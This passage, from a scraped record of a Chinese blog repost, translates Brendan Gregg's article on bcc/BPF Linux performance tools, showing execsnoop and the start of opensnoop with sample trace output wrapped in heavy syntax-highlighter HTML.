hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/d925c992a1aa410e25f0bb681dae99423f162420.jpg"}
{"url_object_id": "9ccbd4ca89f676b9c838a57a82c8d8ab", "title": "7 个使用 bcc/BPF 的性能分析神器", "url": "http://blog.jobbole.com/113328/", "create_date": "2017/12/14", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/478116e0d2ac0c766a25a7c5d7252167.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/17/11/bccbpf-performance\">Brendan Gregg</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9139-1.html\">Linux中国/张守永</a>   </div><blockquote><p>使用伯克利包过滤器 Berkeley Packet Filter（BPF）编译器集合Compiler Collection（BCC）工具深度探查你的 Linux 代码。</p></blockquote>\n<p>在 Linux 中出现的一种新技术能够为系统管理员和开发者提供大量用于性能分析和故障排除的新工具和仪表盘。它被称为增强的伯克利数据包过滤器 enhanced Berkeley Packet Filter（eBPF，或 BPF），虽然这些改进并不是由伯克利开发的，而且它们不仅仅是处理数据包，更多的是过滤。我将讨论在 Fedora 和 Red Hat Linux 发行版中使用 BPF 的一种方法，并在 Fedora 26 上演示。</p>\n<p>BPF 可以在内核中运行由用户定义的沙盒程序，可以立即添加新的自定义功能。这就像按需给 Linux 系统添加超能力一般。 你可以使用它的例子包括如下：</p>\n<ul>\n<li><strong>高级性能跟踪工具</strong>：对文件系统操作、TCP 事件、用户级事件等的可编程的低开销检测。</li>\n<li><strong>网络性能</strong>： 尽早丢弃数据包以提高对 DDoS 的恢复能力，或者在内核中重定向数据包以提高性能。</li>\n<li><strong>安全监控</strong>： 7×24 小时的自定义检测和记录内核空间与用户空间内的可疑事件。</li>\n</ul>\n<p>在可能的情况下，BPF 程序必须通过一个内核验证机制来保证它们的安全运行，这比写自定义的内核模块更安全。我在此假设大多数人并不编写自己的 BPF 程序，而是使用别人写好的。在 GitHub 上的 <a href=\"https://github.com/iovisor/bcc\">BPF Compiler Collection (bcc)</a> 项目中，我已发布许多开源代码。bcc 为 BPF 开发提供了不同的前端支持，包括 Python 和 Lua，并且是目前最活跃的 BPF 工具项目。</p>\n<h3 id=\"toc_1\">7 个有用的 bcc/BPF 新工具</h3>\n<p>为了了解 bcc/BPF 工具和它们的检测内容，我创建了下面的图表并添加到 bcc 项目中。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/bb63b4b8c3e11401acd3a950aee8b737.png\" alt=\"Linux bcc/BPF 跟踪工具图\"></p>\n<p>这些是命令行界面工具，你可以通过 SSH 使用它们。目前大多数分析，包括我的老板，都是用 GUI 和仪表盘进行的。SSH 是最后的手段。但这些命令行工具仍然是预览 BPF 能力的好方法，即使你最终打算通过一个可用的 GUI 使用它。我已着手向一个开源 GUI 添加 BPF 功能，但那是另一篇文章的主题。现在我想向你分享今天就可以使用的 CLI 工具。</p>\n<h4 id=\"toc_2\">1、 execsnoop</h4>\n<p>从哪儿开始呢？如何查看新的进程。那些会消耗系统资源，但很短暂的进程，它们甚至不会出现在 <code>top(1)</code> 命令或其它工具中的显示之中。这些新进程可以使用 <a href=\"https://github.com/brendangregg/perf-tools/blob/master/execsnoop\">execsnoop</a> 进行检测（或使用行业术语说，可以被追踪traced）。 在追踪时，我将在另一个窗口中通过 SSH 登录：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbd5433184554\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/execsnoop\r\nPCOMM            PID    PPID   RET ARGS\r\nsshd             12234  727      0 /usr/sbin/sshd -D -R\r\nunix_chkpwd      12236  12234    0 /usr/sbin/unix_chkpwd root nonull\r\nunix_chkpwd      12237  12234    0 /usr/sbin/unix_chkpwd root chkexpiry\r\nbash             12239  12238    0 /bin/bash\r\nid               12241  12240    0 /usr/bin/id -un\r\nhostname         12243  12242    0 /usr/bin/hostname\r\npkg-config       12245  12244    0 /usr/bin/pkg-config --variable=completionsdir bash-completion\r\ngrepconf.sh      12246  12239    0 /usr/libexec/grepconf.sh -c\r\ngrep             12247  12246    0 /usr/bin/grep -qsi ^COLOR.*none /etc/GREP_COLORS\r\ntty              12249  12248    0 /usr/bin/tty -s\r\ntput             12250  12248    0 /usr/bin/tput colors\r\ndircolors        12252  12251    0 /usr/bin/dircolors --sh /etc/DIR_COLORS\r\ngrep             12253  12239    0 /usr/bin/grep -qi ^COLOR.*none /etc/DIR_COLORS\r\ngrepconf.sh      12254  12239    0 /usr/libexec/grepconf.sh -c\r\ngrep             12255  12254    0 /usr/bin/grep -qsi ^COLOR.*none /etc/GREP_COLORS\r\ngrepconf.sh      12256  12239    0 /usr/libexec/grepconf.sh -c\r\ngrep             12257  12256    0 /usr/bin/grep -qsi ^COLOR.*none /etc/GREP_COLORS\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbd5433184554-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbd5433184554-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/execsnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-2\"><span class=\"crayon-e\">PCOMM            </span><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">PPID   </span><span class=\"crayon-e\">RET </span><span class=\"crayon-e\">ARGS</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-3\"><span class=\"crayon-i\">sshd</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12234</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">727</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sshd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">D</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">R</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-4\"><span class=\"crayon-v\">unix</span><span class=\"crayon-sy\">_</span>chkpwd<span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12236</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12234</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">unix_chkpwd </span><span class=\"crayon-e\">root </span><span class=\"crayon-e\">nonull</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-5\"><span class=\"crayon-v\">unix</span><span class=\"crayon-sy\">_</span>chkpwd<span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12237</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12234</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">unix_chkpwd </span><span class=\"crayon-e\">root </span><span class=\"crayon-e\">chkexpiry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-6\"><span class=\"crayon-i\">bash</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12238</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">bash</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-7\"><span class=\"crayon-i\">id</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">12241</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12240</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">un</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-8\"><span class=\"crayon-i\">hostname</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">12243</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12242</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">hostname</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-9\"><span class=\"crayon-v\">pkg</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">config</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">12245</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12244</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">pkg</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">config</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">variable</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">completionsdir </span><span class=\"crayon-v\">bash</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">completion</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-10\"><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12246</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-11\"><span class=\"crayon-i\">grep</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12247</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12246</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">qsi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">COLOR</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">none</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">GREP_COLORS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-12\"><span class=\"crayon-i\">tty</span><span class=\"crayon-h\">              </span><span class=\"crayon-cn\">12249</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12248</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tty</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">s</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-13\"><span class=\"crayon-i\">tput</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12250</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12248</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">tput </span><span class=\"crayon-e\">colors</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-14\"><span class=\"crayon-i\">dircolors</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">12252</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12251</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dircolors</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">DIR_COLORS</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-15\"><span class=\"crayon-i\">grep</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12253</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">qi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">COLOR</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">none</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">DIR_COLORS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-16\"><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12254</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-17\"><span class=\"crayon-i\">grep</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12255</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12254</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">qsi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">COLOR</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">none</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">GREP_COLORS</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-18\"><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">sh</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">12256</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12239</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">libexec</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grepconf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbd5433184554-19\"><span class=\"crayon-i\">grep</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">12257</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">12256</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">qsi</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">^</span><span class=\"crayon-v\">COLOR</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">none</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">GREP</span><span class=\"crayon-sy\">_</span>COLORS</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbd5433184554-20\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0075 seconds] -->\r\n<p>哇哦。 那是什么？ 什么是 <code>grepconf.sh</code>？ 什么是 <code>/etc/GREP_COLORS</code>？ 是 <code>grep</code> 在读取它自己的配置文件……由 <code>grep</code> 运行的？ 这究竟是怎么工作的？</p>\n<p>欢迎来到有趣的系统追踪世界。 你可以学到很多关于系统是如何工作的（或者根本不工作，在有些情况下），并且发现一些简单的优化方法。 <code>execsnoop</code> 通过跟踪 <code>exec()</code> 系统调用来工作，<code>exec()</code> 通常用于在新进程中加载不同的程序代码。</p>\n<h4 id=\"toc_3\">2、 opensnoop</h4>\n<p>接着上面继续，所以，<code>grepconf.sh</code> 可能是一个 shell 脚本，对吧？ 我将运行 <code>file(1)</code> 来检查它，并使用<a href=\"https://github.com/brendangregg/perf-tools/blob/master/opensnoop\">opensnoop</a> bcc 工具来查看打开的文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634c1d5cbdf937419311\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# /usr/share/bcc/tools/opensnoop\r\nPID    COMM               FD ERR PATH\r\n12420  file                3   0 /etc/ld.so.cache\r\n12420  file                3   0 /lib64/libmagic.so.1\r\n12420  file                3   0 /lib64/libz.so.1\r\n12420  file                3   0 /lib64/libc.so.6\r\n12420  file                3   0 /usr/lib/locale/locale-archive\r\n12420  file               -1   2 /etc/magic.mgc\r\n12420  file                3   0 /etc/magic\r\n12420  file                3   0 /usr/share/misc/magic.mgc\r\n12420  file                3   0 /usr/lib64/gconv/gconv-modules.cache\r\n12420  file                3   0 /usr/libexec/grepconf.sh\r\n1      systemd            16   0 /proc/565/cgroup\r\n1      systemd            16   0 /proc/536/cgroup\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbdf937419311-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbdf937419311-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbdf937419311-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbdf937419311-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbdf937419311-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbdf937419311-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbdf937419311-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbdf937419311-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbdf937419311-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbdf937419311-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbdf937419311-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbdf937419311-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbdf937419311-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634c1d5cbdf937419311-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634c1d5cbdf937419311-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbdf937419311-1\"><span class=\"crayon-p\"># /usr/share/bcc/tools/opensnoop</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634c1d5cbdf937419311-2\"><span class=\"crayon-e\">PID    </span><span class=\"crayon-e\">COMM               </span><span class=\"crayon-e\">FD </span><span class=\"crayon-e\">ERR </span><span class=\"crayon-i\">PATH</span></div><div class=\"crayon-line\" id=\"crayon-5a634c1d5cbdf937419311-3\"><span class=\"crayon-cn\">12420</span><span class=\"crayon-h\">  </span><span 